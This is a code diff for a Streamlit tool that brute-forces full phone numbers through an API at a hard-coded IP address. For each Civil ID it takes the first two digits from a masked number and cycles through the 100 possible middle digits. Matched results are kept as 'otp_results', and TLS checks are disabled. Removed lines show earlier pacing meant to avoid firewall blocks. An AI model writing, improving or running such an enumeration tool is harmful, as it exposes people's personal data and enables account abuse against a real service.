@@ -1,8 +1,6 @@
-import concurrent.futures
 import csv
 import json
 import re
-import threading
 import time
 import pandas as pd
 import requests
@@ -14,7 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Page configuration
 st.set_page_config(
-    page_title="📱 ROP Batch & Multi-Number Match Tool (Safe Mode)", page_icon="📱", layout="wide"
+    page_title="📱 ROP Auto Range Match Tool", page_icon="📱", layout="wide"
 )
 
 # Initialize Session States
@@ -27,9 +25,9 @@ if "is_running" not in st.session_state:
 if "stop_requested" not in st.session_state:
     st.session_state.stop_requested = False
 
-st.title("📱 ROP Batch Match Tool (Safe / Anti-Block Mode)")
+st.title("📱 ROP Auto Range Match Tool (00 to 99 Check)")
 
-# Sidebar Configuration for Host & Headers
+# Sidebar Configuration for Host
 st.sidebar.header("⚙️ Configuration")
 default_host = "5.37.58.147"
 host = st.sidebar.text_input("API Target Host / IP", value=default_host)
@@ -114,7 +112,7 @@ def test_single_phone(
 col1, col2, col3, col4 = st.columns(4)
 
 with col1:
-    start_btn = st.button("🚀 START SAFE SEARCH", type="primary")
+    start_btn = st.button("🚀 START AUTO RANGE MATCH", type="primary")
 with col2:
     stop_btn = st.button("⏹️ STOP", type="secondary")
 with col3:
@@ -167,7 +165,7 @@ if start_btn:
             st.error("Koi valid format nahi mila! Sahi format: CivilID, Last4Digits")
             st.session_state.is_running = False
         else:
-            status_container.info(f"🔄 Running Safe Search for {len(tasks_list)} items...")
+            status_container.info(f"🔄 Running Auto Range Match for {len(tasks_list)} items...")
             session = requests.Session()
             session.verify = False
 
@@ -176,12 +174,10 @@ if start_btn:
                     break
 
                 st.session_state.logs.append(
-                    f"\n--- Processing [{idx+1}/{len(tasks_list)}] Civil ID: {civil_id} ---"
+                    f"\n--- Processing [{idx+1}/{len(tasks_list)}] Civil ID: {civil_id} (Last 4: {suffix}) ---"
                 )
                 
-                # Small delay to prevent network blocking
-                time.sleep(1.0)
-                
+                time.sleep(0.5)
                 success, data = fetch_fresh_token_for_civil_id(
                     session, host, civil_id
                 )
@@ -196,55 +192,34 @@ if start_btn:
                 for masked_num, token_val in mobile_dict.items():
                     if st.session_state.stop_requested or matched_in_this_id:
                         break
+                    
                     clean_digits = re.sub(r"\D", "", masked_num)
                     if len(clean_digits) < 2:
                         continue
-                    prefix = clean_digits[:2]
-
-                    phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
                     
-                    # Safe slower batch size to avoid triggering firewall blocks
-                    batch_size = 2 
+                    # Extract first 2 digits from the masked response number
+                    prefix = clean_digits[:2]
+                    st.session_state.logs.append(f"⚡ Testing Mask: {masked_num} -> Prefix: {prefix} with range 00-99")
 
-                    for i in range(0, len(phone_numbers), batch_size):
+                    # Automatically generate numbers from prefix + 00 to 99 + suffix
+                    for i in range(100):
                         if st.session_state.stop_requested or matched_in_this_id:
                             break
-                        batch = phone_numbers[i : i + batch_size]
                         
-                        # Short delay between tiny batches
-                        time.sleep(0.3)
+                        middle_digits = f"{i:02d}"
+                        phone = f"{prefix}{middle_digits}{suffix}"
 
-                        with concurrent.futures.ThreadPoolExecutor(
-                            max_workers=batch_size
-                        ) as executor:
-                            futures = {
-                                executor.submit(
-                                    test_single_phone,
-                                    session,
-                                    host,
-                                    civil_id,
-                                    phone,
-                                    token_val,
-                                    civil_id_token,
-                                ): phone
-                                for phone in batch
-                            }
+                        # Test each generated phone number sequentially with a small delay
+                        time.sleep(0.2)
+                        if test_single_phone(session, host, civil_id, phone, token_val, civil_id_token):
+                            matched_in_this_id = True
+                            break
 
-                            for future in concurrent.futures.as_completed(futures):
-                                if st.session_state.stop_requested:
-                                    break
-                                try:
-                                    if future.result():
-                                        matched_in_this_id = True
-                                        break
-                                except Exception:
-                                    pass
-
-            status_container.success("✅ Batch Search Completed!")
+            status_container.success("✅ Auto Range Match Completed!")
             st.session_state.is_running = False
             st.rerun()
 
-# Display Results Section
+# Display Results Section (Only Matched Results)
 st.markdown("---")
 st.subheader("🎯 Matched Results")
 if st.session_state.otp_results:
